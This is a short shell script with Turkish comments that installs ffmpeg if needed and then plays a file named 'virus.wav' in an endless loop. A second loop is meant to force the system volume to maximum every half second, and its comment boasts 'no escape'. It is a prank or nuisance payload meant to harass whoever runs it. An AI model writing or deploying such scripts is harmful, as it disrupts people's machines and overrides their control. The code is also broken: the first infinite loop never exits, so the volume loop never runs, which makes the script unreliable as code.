#!/bin/sh

WAV="virus.wav"

# ffplay yoksa ffmpeg kur
if ! command -v ffplay >/dev/null 2>&1; then
    apt update
    apt install -y ffmpeg
fi

while true
do
    ffplay -nodisp -autoexit "$WAV" >/dev/null 2>&1
done
# Ses seviyesini her saniye %100'e (son ses) çeken döngü
while true
do
    # AlsaMixer veya PulseAudio üzerinden sesi sona vurur
    amixer set Master 100% > /dev/null 2>&1
    pactl set-sink-volume @DEFAULT_SINK@ 100% > /dev/null 2>&1
    sleep 0.5 # Yarım saniyede bir kontrol eder, kaçış yok!
done 
